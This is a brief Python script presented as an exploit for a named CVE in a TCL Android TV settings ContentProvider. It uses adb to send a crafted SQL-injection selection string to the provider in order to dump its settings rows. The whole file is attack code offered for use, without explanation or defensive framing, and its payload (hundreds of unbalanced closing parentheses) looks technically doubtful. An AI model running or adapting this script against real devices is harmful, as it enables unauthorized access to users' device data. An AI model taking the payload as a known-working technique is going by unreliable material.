#!/usr/bin/env python3
"""CVE-2025-22451 — TCL Android TV Settings. ContentProvider query with a
crafted selection that escapes the projection bounds."""
import subprocess, sys

def exploit(host=None):
    adb = ["adb"] + (["-s", host] if host else [])
    sel = "1=1) OR (1=1" + ")" * 256
    cmd = adb + ["shell", "content", "query", "--uri",
                 "content://com.tcl.settings.provider/settings",
                 "--projection", "_id:name:value:extra",
                 "--where", sel]
    r = subprocess.run(cmd, capture_output=True, text=True)
    print(r.stdout or r.stderr)
    return r.returncode == 0

def main():
    exploit(sys.argv[1] if len(sys.argv) > 1 else None)

if __name__ == "__main__":
    main()
